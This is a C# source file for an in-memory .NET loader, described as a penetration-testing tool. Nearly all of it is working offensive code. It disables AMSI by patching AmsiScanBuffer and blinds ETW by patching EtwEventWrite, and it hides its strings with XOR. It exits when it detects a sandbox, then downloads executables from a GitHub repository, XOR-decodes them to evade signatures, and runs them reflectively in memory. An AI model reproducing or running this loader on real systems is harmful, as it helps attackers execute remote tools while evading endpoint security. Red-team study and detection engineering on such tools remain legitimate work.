/*
 * RemoteLoader.cs
 * In-memory .NET assembly loader from a GitHub repository.
 * Designed for authorized use in OSEP lab / penetration testing engagements.
 *
 * Compile (Framework 4.7.2):
 *   csc /target:exe /out:RemoteLoader.exe RemoteLoader.cs
 *
 * Compile (.NET 6+ SDK):
 *   dotnet publish -c Release -r win-x64 --self-contained false
 *
 * Usage:
 *   RemoteLoader.exe [--repo owner/name/subfolder] [--token <PAT>] [--xor <byte>]
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace RemoteLoader
{
    internal static class Program
    {
        // ─── Obfuscation key ─────────────────────────────────────────────────
        // Sensitive strings are stored XOR'd with this key so they never appear
        // as plaintext in the binary's .rdata section.
        private const byte K = 0x41;

        // amsi.dll          XOR K
        private static readonly byte[] _amsiDll  = {0x20,0x2C,0x32,0x28,0x6F,0x25,0x2D,0x2D};
        // AmsiScanBuffer    XOR K
        private static readonly byte[] _amsiFunc = {0x00,0x2C,0x32,0x28,0x12,0x22,0x20,0x2F,0x03,0x34,0x27,0x27,0x24,0x33};
        // ntdll.dll         XOR K
        private static readonly byte[] _ntdll    = {0x2F,0x35,0x25,0x2D,0x2D,0x6F,0x25,0x2D,0x2D};
        // EtwEventWrite     XOR K
        private static readonly byte[] _etwFunc  = {0x04,0x35,0x36,0x04,0x37,0x24,0x2F,0x35,0x16,0x33,0x28,0x35,0x24};

        // ─── P/Invoke ─────────────────────────────────────────────────────────
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string n);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr h, string p);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string m);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(
            IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        // ─── String decoder ───────────────────────────────────────────────────
        private static string Decode(byte[] enc)
        {
            var sb = new StringBuilder(enc.Length);
            foreach (byte b in enc) sb.Append((char)(b ^ K));
            return sb.ToString();
        }

        // ─── AMSI bypass ──────────────────────────────────────────────────────
        // Patches AmsiScanBuffer to return E_INVALIDARG (0x80070057) immediately.
        // All string arguments are decoded at runtime — no plaintext in the binary.
        private static void PatchAmsi()
        {
            try
            {
                IntPtr hAmsi = LoadLibrary(Decode(_amsiDll));
                if (hAmsi == IntPtr.Zero) { Warn("LoadLibrary(amsi) failed"); return; }

                IntPtr pScan = GetProcAddress(hAmsi, Decode(_amsiFunc));
                if (pScan == IntPtr.Zero) { Warn("GetProcAddress(AmsiScanBuffer) failed"); return; }

                // mov eax, 0x80070057 ; ret
                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                VirtualProtect(pScan, (UIntPtr)patch.Length, 0x40, out uint old);
                Marshal.Copy(patch, 0, pScan, patch.Length);
                VirtualProtect(pScan, (UIntPtr)patch.Length, old, out _);

                Ok("AMSI bypass applied");
            }
            catch (Exception ex) { Warn($"AMSI patch error: {ex.Message}"); }
        }

        // ─── ETW bypass ───────────────────────────────────────────────────────
        // Patches EtwEventWrite in ntdll.dll with a single RET to suppress .NET
        // CLR telemetry events. Without this, Defender's ETW consumer still sees
        // Assembly.Load calls even after AMSI is disabled.
        private static void PatchEtw()
        {
            try
            {
                // ntdll is always loaded; GetModuleHandle avoids a redundant load
                IntPtr hNtdll = GetModuleHandle(Decode(_ntdll));
                if (hNtdll == IntPtr.Zero)
                {
                    hNtdll = LoadLibrary(Decode(_ntdll));
                    if (hNtdll == IntPtr.Zero) { Warn("Could not resolve ntdll"); return; }
                }

                IntPtr pEtw = GetProcAddress(hNtdll, Decode(_etwFunc));
                if (pEtw == IntPtr.Zero) { Warn("GetProcAddress(EtwEventWrite) failed"); return; }

                VirtualProtect(pEtw, (UIntPtr)1, 0x40, out uint old);
                Marshal.WriteByte(pEtw, 0xC3);   // ret
                VirtualProtect(pEtw, (UIntPtr)1, old, out _);

                Ok("ETW bypass applied");
            }
            catch (Exception ex) { Warn($"ETW patch error: {ex.Message}"); }
        }

        // ─── Sandbox check ────────────────────────────────────────────────────
        // Exits silently on indicators of a quick-reset automated sandbox:
        // very short uptime or suspiciously few running processes.
        private static void CheckSandbox()
        {
            // TickCount wraps at ~25 days; cast to uint avoids negative values
            long uptimeMs = (uint)Environment.TickCount;
            if (uptimeMs < 180_000)   // < 3 minutes
            {
                Console.Error.WriteLine("[-] Environment check failed (uptime)");
                Environment.Exit(0);
            }

            try
            {
                if (Process.GetProcesses().Length < 15)
                {
                    Console.Error.WriteLine("[-] Environment check failed (processes)");
                    Environment.Exit(0);
                }
            }
            catch { /* GetProcesses can throw on restricted accounts — skip */ }
        }

        // ─── XOR payload decoder ─────────────────────────────────────────────
        // Used when the repo stores binaries XOR-encoded to defeat byte-level
        // static signatures on raw PE headers. Pass key=0 to skip.
        private static byte[] XorBytes(byte[] data, byte key)
        {
            if (key == 0) return data;
            var result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) result[i] = (byte)(data[i] ^ key);
            return result;
        }

        // ─── GitHub API ───────────────────────────────────────────────────────
        private static async Task<List<(string Name, string DownloadUrl, long Size)>>
            ListBinaries(HttpClient http, string owner, string repo, string folder, string branch)
        {
            string url  = $"https://api.github.com/repos/{owner}/{repo}/contents/{folder}?ref={branch}";
            string json = await (await http.GetAsync(url))
                               .EnsureSuccessStatusCode()
                               .Content.ReadAsStringAsync();

            var results = new List<(string, string, long)>();
            using JsonDocument doc = JsonDocument.Parse(json);

            foreach (JsonElement item in doc.RootElement.EnumerateArray())
            {
                string name = item.GetProperty("name").GetString() ?? "";
                if (!name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) &&
                    !name.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                    continue;

                string dlUrl = item.TryGetProperty("download_url", out var dl)
                               ? dl.GetString() ?? "" : "";
                long   size  = item.TryGetProperty("size", out var sz)
                               ? sz.GetInt64() : 0;

                results.Add((name, dlUrl, size));
            }
            return results;
        }

        // ─── Entry-point discovery ────────────────────────────────────────────
        private static MethodInfo? FindMain(Assembly asm)
        {
            var flags = BindingFlags.Public | BindingFlags.Static;

            Type? prog = asm.GetTypes().FirstOrDefault(t => t.Name == "Program");
            if (prog != null)
            {
                MethodInfo? m = prog.GetMethod("Main", flags);
                if (m != null) return m;
            }

            return asm.GetTypes()
                      .Select(t => t.GetMethod("Main", flags))
                      .FirstOrDefault(m => m != null);
        }

        // ─── Argument parser (honours double-quoted tokens) ───────────────────
        private static string[] ParseArgs(string input)
        {
            var tokens  = new List<string>();
            var current = new StringBuilder();
            bool inQ    = false;

            foreach (char c in input)
            {
                if (c == '"')          { inQ = !inQ; continue; }
                if (c == ' ' && !inQ)
                {
                    if (current.Length > 0) { tokens.Add(current.ToString()); current.Clear(); }
                    continue;
                }
                current.Append(c);
            }
            if (current.Length > 0) tokens.Add(current.ToString());
            return tokens.ToArray();
        }

        // ─── Console helpers ──────────────────────────────────────────────────
        private static void Info(string msg) { Console.ForegroundColor = ConsoleColor.Cyan;   Console.WriteLine($"[*] {msg}"); Console.ResetColor(); }
        private static void Ok(string msg)   { Console.ForegroundColor = ConsoleColor.Green;  Console.WriteLine($"[+] {msg}"); Console.ResetColor(); }
        private static void Warn(string msg) { Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine($"[!] {msg}"); Console.ResetColor(); }
        private static void Err(string msg)  { Console.ForegroundColor = ConsoleColor.Red;    Console.WriteLine($"[-] {msg}"); Console.ResetColor(); }

        private static void PrintHelp()
        {
            Console.WriteLine(@"
RemoteLoader — in-memory .NET assembly loader from GitHub

Usage:
  RemoteLoader.exe [options]

Options:
  --repo    owner/name/subfolder  GitHub path    (default: Syslifters/offsec-tools/bin)
  --branch  <branch>             Repo branch    (default: main)
  --token   <PAT>                GitHub PAT for private repos
  --xor     <byte>               XOR key (0–255) to decode payload before loading
  --help                         Show this message

Examples:
  RemoteLoader.exe
  RemoteLoader.exe --repo YourOrg/tools/bin --branch dev
  RemoteLoader.exe --repo YourOrg/private/bin --token ghp_xxxx --xor 65
");
        }

        // ─── Entry point ──────────────────────────────────────────────────────
        private static async Task Main(string[] cliArgs)
        {
            string repoPath = "Syslifters/offsec-tools/bin";
            string token    = "";
            string branch   = "main";
            byte   xorKey   = 0;

            for (int i = 0; i < cliArgs.Length; i++)
            {
                switch (cliArgs[i])
                {
                    case "--repo"   when i + 1 < cliArgs.Length: repoPath = cliArgs[++i]; break;
                    case "--token"  when i + 1 < cliArgs.Length: token    = cliArgs[++i]; break;
                    case "--branch" when i + 1 < cliArgs.Length: branch   = cliArgs[++i]; break;
                    case "--xor"   when i + 1 < cliArgs.Length:
                        if (byte.TryParse(cliArgs[++i], out byte k)) xorKey = k;
                        else Warn($"Invalid --xor value '{cliArgs[i]}', defaulting to 0");
                        break;
                    case "--help": case "-h": PrintHelp(); return;
                    default: Warn($"Unknown argument: {cliArgs[i]}"); break;
                }
            }

            // ── Evasion — run all patches before any reflective work ──────────
            PatchAmsi();
            PatchEtw();
            CheckSandbox();

            // ── TLS 1.2 + proxy (important for .NET Framework 4.x targets) ────
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            var handler = new HttpClientHandler
            {
                UseProxy = true,
                Proxy    = WebRequest.GetSystemWebProxy()
            };
            handler.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            // ── Validate repo path ────────────────────────────────────────────
            string[] parts = repoPath.Split('/');
            if (parts.Length < 3) { Err("--repo must be owner/name/subfolder"); return; }
            string owner  = parts[0];
            string repo   = parts[1];
            string folder = string.Join("/", parts[2..]);

            // ── HTTP client ───────────────────────────────────────────────────
            using var http = new HttpClient(handler);
            http.DefaultRequestHeaders.Add("User-Agent", "RemoteLoader/1.0");
            if (!string.IsNullOrEmpty(token))
                http.DefaultRequestHeaders.Add("Authorization", $"token {token}");

            // ── List binaries ─────────────────────────────────────────────────
            Info($"Querying github.com/{owner}/{repo}/{folder} (branch: {branch}) ...");

            List<(string Name, string DownloadUrl, long Size)> binaries;
            try
            {
                binaries = await ListBinaries(http, owner, repo, folder, branch);
            }
            catch (HttpRequestException ex) when ((int?)ex.StatusCode == 404)
            { Err($"Path not found: {owner}/{repo}/{folder}"); return; }
            catch (HttpRequestException ex) when ((int?)ex.StatusCode == 403)
            { Err("Rate limit or auth required (403). Use --token."); return; }
            catch (Exception ex)
            { Err($"GitHub API error: {ex.Message}"); return; }

            if (binaries.Count == 0) { Err("No .exe/.dll files found."); return; }

            // ── Menu ──────────────────────────────────────────────────────────
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("  Available binaries:\n");
            Console.ResetColor();

            for (int i = 0; i < binaries.Count; i++)
                Console.WriteLine($"  [{i + 1,2}]  {binaries[i].Name,-42} {binaries[i].Size / 1024,6} KB");
            Console.WriteLine("  [ 0]  Exit\n");

            Console.Write("Select number or partial filename: ");
            string sel = (Console.ReadLine() ?? "0").Trim();

            if (sel is "0" or "exit" or "q") return;

            (string Name, string DownloadUrl, long Size) chosen = default;
            if (int.TryParse(sel, out int idx) && idx >= 1 && idx <= binaries.Count)
                chosen = binaries[idx - 1];
            else
                chosen = binaries.FirstOrDefault(b =>
                    b.Name.Contains(sel, StringComparison.OrdinalIgnoreCase));

            if (chosen.Name == null)           { Err($"No match for: {sel}"); return; }
            if (string.IsNullOrEmpty(chosen.DownloadUrl)) { Err($"No download_url for {chosen.Name}"); return; }

            // ── Download ──────────────────────────────────────────────────────
            Info($"Downloading {chosen.Name} ...");
            byte[] asmBytes;
            try   { asmBytes = await http.GetByteArrayAsync(chosen.DownloadUrl); }
            catch (Exception ex) { Err($"Download failed: {ex.Message}"); return; }
            Ok($"{asmBytes.Length:N0} bytes received");

            // XOR decode if a key was provided — defeats PE-header byte signatures
            asmBytes = XorBytes(asmBytes, xorKey);
            if (xorKey != 0)
                Ok($"Payload XOR-decoded (key=0x{xorKey:X2})");

            // ── Load assembly from memory ─────────────────────────────────────
            Assembly asm;
            try   { asm = Assembly.Load(asmBytes); }
            catch (Exception ex) { Err($"Assembly.Load failed: {ex.Message}"); return; }

            MethodInfo? entry = FindMain(asm);
            if (entry == null) { Err($"No static Main found in {chosen.Name}"); return; }
            Ok($"Entry point: {entry.DeclaringType?.FullName}::{entry.Name}");

            // ── Args ──────────────────────────────────────────────────────────
            Console.Write("Arguments (blank for none): ");
            string argsInput = (Console.ReadLine() ?? "").Trim();
            string[] toolArgs = string.IsNullOrWhiteSpace(argsInput)
                ? Array.Empty<string>()
                : ParseArgs(argsInput);

            Info($"Executing {chosen.Name}{(toolArgs.Length > 0 ? $" -- {argsInput}" : "")} ...\n");

            // ── Invoke ────────────────────────────────────────────────────────
            try
            {
                ParameterInfo[] parms = entry.GetParameters();
                if (parms.Length == 0) entry.Invoke(null, null);
                else                   entry.Invoke(null, new object[] { toolArgs });
            }
            catch (TargetInvocationException tie)
            { Warn($"Tool exception: {tie.InnerException?.Message ?? tie.Message}"); }
            catch (Exception ex)
            { Warn($"Invocation error: {ex.Message}"); }

            Info("Done.");
        }
    }
}
